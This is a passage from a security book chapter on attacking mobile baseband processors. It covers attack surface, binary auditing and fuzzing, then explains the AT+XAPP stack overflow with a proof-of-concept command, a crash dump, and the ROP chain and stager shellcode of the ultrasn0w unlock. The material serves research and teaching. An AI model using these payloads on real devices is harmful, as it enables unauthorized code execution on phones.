Considerable complexity is hidden in this interface, especially given the fact that
SIM Application Toolkit (STK) and USIM Application Toolkit (USAT) messages
from the SIM need to be parsed and processed. For Qualcomm basebands, the
USB stack might be a viable target for local attacks as well. According to mail-
ing list posts on the linux-arm-msm mailing list, it seems that Qualcomm is
using a ChipIdea core with the corresponding stack. Interestingly, the baseband
fi rmware for the X-Gold 61x chipset also includes a USB stack; however it does
not seem to be accessible from the application processor.
NOTE A soft unlock is a nonpermanent modifi cation of the cellular stack
that needs to be reapplied every time the baseband processor is restarted,
usually by injecting a task. This is in contrast to the earlier unlocks — which
could be called hard unlocks — that permanently altered the baseband fi rm-
ware stored in fl ash memory.
When mapping the attack surface of the cellular stack exposed over the air
interface, you start at the lowest layer. Decoders of audio data are a frequent
source of memory corruption bugs, even in the domain of GSM stacks. Look
carefully and you will be able to fi nd examples of voice codecs that send length
fi elds over the air, which may or may not be trusted by the cellular stack in
question. However, the downside of such bugs is that they need an established
voice connection as a precondition. Up in the data link layer memory corrupting
bugs are possible at this layer as well, however frames are too short (17 bytes)
to make exploits easy.
Arriving at the network layer you are overwhelmed by a Smörgåsbord of
opportunities. To understand, you have to look at 3GPP 24.008 — this 3GPP
specifi cation supersedes GSM specifi cation 04.08 — to see how messages on layer
3 are encoded: Messages can be up to 253 bytes long and encoded in different
ways. The designers of this fi ne standard were apparently infl uenced by ASN.1:
They allow variable-length fi elds for a wide variety of protocol messages. In a
number of cases even entities that are explicitly stated to be of fi xed length are
cc1111..iinndddd 334466 44//1166//22001122 55::4488::1199 PPMM
Chapter 11 n Baseband Attacks 347
encoded in a format that transmits their length over the air, creating ambigu-
ity for the parser. However, this is not the only fruitful area; going even higher
in the sublayers of layer 3 you fi nd plenty of opportunities to corrupt memory
in implementations in the handling of supplementary data and the parsing of
short messages. Last but not least, spatial memory corruptions are not the only
kind cellular stacks allow. Rather, the fact that many parts of the GSM stack are
driven by explicit, large, and complicated state machines gives implementers a
more than suffi cient chance of introducing temporal memory corruptions such
as use-after-frees into their codebase as well, especially considering the fact that
allocations and deallocations of some data structures in these state machines
are not necessarily done by the same task.
NOTE For an example of large and complicated state machines, refer to
Figure 4.1a (Overview mobility management protocol/MS Side in
3GPP24.008.)
However, identifying and reproducing temporal memory corruptions without
source code or instrumentation for the cellular stack is a hard problem.
Static Analysis on Binary Code Like it’s 1999
Because of the number of functions in the IDA Pro databases of the baseband
fi rmware, performing even a shallow audit of the codebase for memory cor-
ruptions will be a humongous task.
A straightforward way to fi nd potential memory corruptions in baseband
stacks is by looking for functions that perform memory block transfers such as
memcpy(), memmove(), and friends, and investigate which of these functions an
attacker can use to obtain suffi cient control over the length and/or the destina-
tion of the transfer. This task is aided by the fact that assertions are placed all
over the codebase that log the fi lename and the line number (in some cases a
message and a result code is included as well) whenever situations crop up that
were not expected; these strings are even present in the production versions of
the baseband fi rmware.
NOTE More advanced ways exist to fi nd memory writes that can lead to
potential memory corruptions, for instance by loop detection using domina-
tor trees. For more information see Halvar Flake’s slide deck “More fun with
Graphs” from Blackhat Federal 2003 and Pete Silberman’s article on loop
detection in the fi rst volume of the Uninformed journal.
This way of auditing was very successful on a number of stacks; however,
the vast number of memory copies in the IFX stack transfers constant-length
blocks.
cc1111..iinndddd 334477 44//1166//22001122 55::4488::1199 PPMM
348 Chapter 11 n Baseband Attacks
Specifi cation-Guided Fuzz Testing
A different approach to fi nding potential memory corruptions is to read the
GSM and 3GPP specifi cations carefully and take note of all messages transmitted
that have variable-length elements. For each of these messages, you can then try
sending such a message with one or more elements having a length not sup-
ported by the specifi cation (this may be larger than the allowed maximum or
smaller than a minimum specifi ed) and observing whether a crash is triggered
on the device. A number of problems exist with this approach, however. First,
although it is easy to fuzz test messages that operate in a “stateless” fashion,
such as functions related to Mobility Management, things become trickier if
you try to fi nd bugs in the Call Control sublayer, for example. Here certain
messages are available only for established calls. Second, you will need to have
a fairly complete understanding of the protocol you are trying to fuzz. With
GSM this is diffi cult, as the protocol is distributed across thousands of standard
documents, and you might easily miss the relevance of some of them. In fact, as
there are several revisions of most standards, you might even miss something
if you’re not aware of all revisions as you do not know a priori which revision
of the GSM standard a certain stack conforms to. Last but not least you will
deal with a large number of crashes that turn out to be non-exploitable and it
will take you a long time to understand which of your crashes are. In general,
meaningful fuzz testing is hard to perform with cellular stacks because the
specifi cations are full of explicitly specifi ed state machines that make many
code paths hard to reach.
However, note that the bug — described later in this chapter, CVE-2010-
3832 — indeed was found by a procedure that could be called “specifi cation-
guided fuzz testing.”
Exploiting the Baseband
This section examines two examples of memory corruption vulnerabilities
that can be used to take control over the baseband. The fi rst one is a local
vulnerability that can be exploited through the AT command interpreter. The
second one is a vulnerability that can be used with an over-the-air interface
to attack vulnerable iPhones remotely by having a rogue base station in its
proximity.
A Local Stack Buffer Overfl ow: AT+XAPP
The AT+XAPP vulnerability is a classic stack buffer overfl ow that has been used as
one of the injection vectors by the ultrasn0w unlock. It is present in all S-Gold
cc1111..iinndddd 334488 44//1166//22001122 55::4488::1199 PPMM
Chapter 11 n Baseband Attacks 349
2 basebands, the X-Gold 608 basebands up to versions 05.13.04 (iPhone 3/3GS)
and 06.15.00 (iPad), as well as in the X-Gold 61x baseband in version 01.59.00.
The vulnerability was independently discovered by @sherif_hashim, @Oranav,
@westbaer, and geohot by testing AT commands for crashes.
Having an easily exploitable local memory corruption is a very useful step
before investigating remote vulnerabilities. The following example shows the
effect of the PoC trigger on an iPhone 2G running the ICE baseband version
04.05.04_G:
# ./sendmodem ‘AT+XAPP=”####################################4444555566667777
PPPP”’
Sending command to modem: AT
------.+
AT
OK
Sending command to modem:
AT+XAPP=”####################################4444555566667777PPPP”
-.+
# ./sendmodem ‘AT+XLOG’
Sending command to modem: AT
-.+
AT
OK
Sending command to modem: AT+XLOG
-........+
AT+XLOG
+XGENDATA: “DEV_ICE_MODEM_04.05.04_G
“
+XLOG: Exception Number: 1
Trap Class: 0xBBBB (HW PREFETCH ABORT TRAP)
System Stack:
0xA0086800
[176 DWORDs omitted]
0x00000000
Date: 15.01.2012
Time: 05:47
Register:
r0: 0x00000000 r1: 0x00000000 r2: 0xFFFF231C
r3: 0xB0101FF9 r4: 0x34343434 r5: 0x35353535
r6: 0x36363636 r7: 0x37373737 r8: 0x00000000
r9: 0xA00028E4 r10: 0xB00AC938 r11: 0xB00B67CC
r12: 0xA0114F95 r13: 0xB00B2CF4 r14: 0xA010E97D
r15: 0x50505054
SPSR: 0x40000013 DFAR: 0x00000001 DFSR: 0x00000005
OK
#
cc1111..iinndddd 334499 44//1166//22001122 55::4488::1199 PPMM
350 Chapter 11 n Baseband Attacks
NOTE This example uses sendmodem from http://code.google.com/p/
iphone-elite/wiki/sendmodem to communicate with the baseband. If you
want to interface with the AT command parser on the iPhone 4 GSM, use /
dev/dlci.spi-baseband.extra_0 instead of /dev/tty.debug.
As you can see, this overfl ow can be used to set registers r4–r7 as well as the
program counter. You can easily use this overfl ow to inject your own code into
the baseband.
The ultrasn0w Unlock
Here you investigate how the AT+XAPP overfl ow was used by the ultrasn0w
unlock to circumvent the network lock on the iPhone 4.
First you have to understand the logistics of the ultrasn0w package. This
unlock works by injecting a dynamic library into the CommCenter process using
the MobileSubstrate framework. This dynamic library — after checking that it
is talking to a supported version of the baseband software — sends a sequence
of AT commands to the baseband processor that exploits the AT+XAPP overfl ow
and places a sequence of payloads there. The fi nal goal is to intercept and change
messages sent and received by the so-called SEC thread (func_sec_process) to
fake an unlocked state to the rest of the cellular stack communicating. In previous
versions of ultrasn0w for the X-Gold 608 chipset, this was achieved by creating
a separate Nucleus task that intercepted mailbox messages and replaced them.
In the ultrasn0w version for the iPhone 4, a different route is taken: The unlock
overwrites parts of ThreadX that are responsible for the interthread communi-
cation of the SEC thread. This section covers the tricks used to achieve this; the
latest version of ultrasn0w for the iPhone4 is by far the most elaborate unlock
in existence, bordering on art.
If you disassemble the dynamic object ultrasn0w.dylib located in /Library
/MobileSubstrate/DynamicLibraries on your iPhone after the installation of
ultrasn0w, you fi nd an array of pointers to strings called unlock_strings that
points to four different instantiations of the at+xapp overfl ow exploited on the
baseband processor. Dissecting these allows you to unravel the unlock and
appreciate its level of sophistication.
Here is the initial code injection. Already in the fi rst unlock string sent, you
might notice something unexpected; instead of code being injected directly, a
ROP chain comprised of a single gadget (0x6014A0F1) is used to stitch together
a piece of code at the very high end of memory:
0x00000000 DCD 0x34343434 ; R4 [unused]
0x00000004 DCD 0x35353535 ; R5 [unused]
0x00000008 DCD 0x36363636 ; R6 [unused]
0x0000000C DCD 0x37373737 ; R7 [unused]
cc1111..iinndddd 335500 44//1166//22001122 55::4488::1199 PPMM
Chapter 11 n Baseband Attacks 351
0x00000010 DCD 0x6014A0F3 ; POP {R3-R5}, PC
0x00000014 DCD ‘UUUU’ ; R3 [unused]
0x00000018 DCD 0x47804807 ; R4 [code/data]
0x0000001C DCD 0xFFFF1FD0 ; R5 [address]
0x00000020 DCD 0x6014A0F1 ; STR R4, [R5]
0x00000020 ; POP {R3-R5}, PC
0x00000024 DCD ‘UUUU’ ; R3 [unused]
0x00000028 DCD 0xBC0F1C07 ; R4 [code/data]
0x0000002C DCD 0xFFFF1FD4 ; R5 [address]
0x00000030 DCD 0x6014A0F1 ; STR R4, [R5]
0x00000030 ; POP {R3-R5}, PC
[...]
0x000000B4 DCD ‘UUUU ; R3 [unused]
0x000000B8 DCD 0x601FD9FC ; R4 [code/data]
0x000000BC DCD 0xFFFF1FF8 ; R5 [address]
0x000000C0 DCD 0x6014A0F1 ; STR R4, [R5]
0x000000C0 ; POP {R3-R5}, PC
0x000000C4 DCD ‘3333’ ; R3 [unused]
0x000000C8 DCD ‘4444’ ; R4 [unused]
0x000000CC DCD ‘5555’ ; R5 [unused]
0x000000D0 DCD 0xFFFF1FD1 ; entry point
0x000000D4 DCD 0xFFFF04D0 ; [2nd stage] R0 (memcpy dst)
0x000000D8 DCD 0x6087A7BC ; [2nd stage] R1 (memcpy src)
0x000000DC DCD 0x1010159 ; [2nd stage] R2 (1st summand of len)
0x000000E0 DCD 0xFEFEFEFF ; [2nd stage] R3 (2nd summand of len)
Each call of the ROP gadget consumes four arguments from the stack that are
placed into registers r3-r5 and PC. After 11 words have been written, the execu-
tion fl ow is redirected to the Thumb code created. Following is the disassembly:
0xFFFF1FD0 CODE16
0xFFFF1FD0 07 48 LDR R0, =0x6018135C
0xFFFF1FD2 80 47 BLX R0 ; call disable_ints
0xFFFF1FD4 07 1C MOVS R7, R0
; preserve CPSR
0xFFFF1FD6 0F BC POP {R0-R3}\; get args for memcpy
0xFFFF1FD8 D2 18 ADDS R2, R2, R3 ; fi x up length
0xFFFF1FDA 07 4B LDR R3, =0x601FD9FC
0xFFFF1FDC 98 47 BLX R3; call memcpy
0xFFFF1FDE 38 1C MOVS R0, R7; get preserved CPSR
0xFFFF1FE0 04 49 LDR R1, =0x6018136C
0xFFFF1FE2 88 47 BLX R1 ; call restore_cpsr
0xFFFF1FE4 01 49 LDR R1, =0x72883C6C ; for clean…
0xFFFF1FE6 8D 46 MOV SP, R1; continuation
0xFFFF1FE8 48 1A SUBS R0, R1, R1; clear R0
0xFFFF1FEA F0 BD POP {R4-R7,PC} ; no crash, please
0xFFFF1FEA ; ---------------------------------------
0xFFFF1FEC 6C 3C 88 72 new_sp DCD 0x72883C6C; DATA XREF: 0xFFFF1FE4
0xFFFF1FF0 5C 13 18 60 P_disable_ints DCD 0x6018135C; DATA XREF: 0xFFFF1FD0
0xFFFF1FF4 6C 13 18 60 P_restore_cpsr DCD 0x6018136C; DATA XREF: 0xFFFF1FE0
0xFFFF1FF8 FC D9 1F 60 P_memcpy DCD 0x601FD9FC; DATA XREF: 0xFFFF1FDA
cc1111..iinndddd 335511 44//1166//22001122 55::4488::1199 PPMM
352 Chapter 11 n Baseband Attacks
This code is a stager routine that copies the code from the remaining unlock
string to another area at the top end of the memory. The code in question lives
at 0xFFFF04D0 and disassembles as follows:
0xFFFF04D0 detour_0xFFFF04D0 ; detour to ROM
0xFFFF04D0 LDR PC, =0x40736334
0xFFFF04D0 ; --------------------------------------------------
0xFFFF04D4 CODE16
0xFFFF04D4 org_0xFFFF04D0 DCD 0x40736334 ; DATA XREF: detour_0xFFFF04D0
0xFFFF04D8 ; -----------------------------------------------
0xFFFF04D8
0xFFFF04D8 decoder_entry
0xFFFF04D8 LDR R0, =0x60FA011F
0xFFFF04DA SUBS R0, #0x80 ; avoid 0 bytes
0xFFFF04DC SUBS R0, #0x80 ; R0 = 0x60FA001F
0xFFFF04DE LDR R2, =0x60701280
0xFFFF04E0 STR R0, [R2]
0xFFFF04E2 ADDS R4, R4, R7
0xFFFF04E4 LDR R0, =0x6018135C
0xFFFF04E6 BLX R0 ; call disable_ints
0xFFFF04E8 MOVS R7, R0
0xFFFF04EA ADDS R2, R5, R6
0xFFFF04EC MOVS R5, 0x22 ; ‘”’
0xFFFF04F0
0xFFFF04F0 decoder_loop ; CODE XREF: 0xFFFF0508
0xFFFF04F0 LDRB R0, [R4]
0xFFFF04F2 CMP R0, R5 ; check for end of str
0xFFFF04F4 BEQ break_loop
0xFFFF04F6 NOP
0xFFFF04F8 CMP R0, #0xFF ; escape character
0xFFFF04FA BNE non_escaped
0xFFFF04FC ADDS R4, #1 ; skip 0xFF
0xFFFF04FE LDRB R0, [R4]
0xFFFF0500 ADDS R0, #1
0xFFFF0502
0xFFFF0502 non_escaped ; CODE XREF: 0xFFFF04FA
0xFFFF0502 STRB R0, [R2]
0xFFFF0504 ADDS R4, #1
0xFFFF0506 ADDS R2, #1
0xFFFF0508 B decoder_loop
0xFFFF050A ; ------------------------------------------------------
0xFFFF050A
0xFFFF050A break_loop ; CODE XREF: 0xFFFF04F4
0xFFFF050A MOVS R0, R7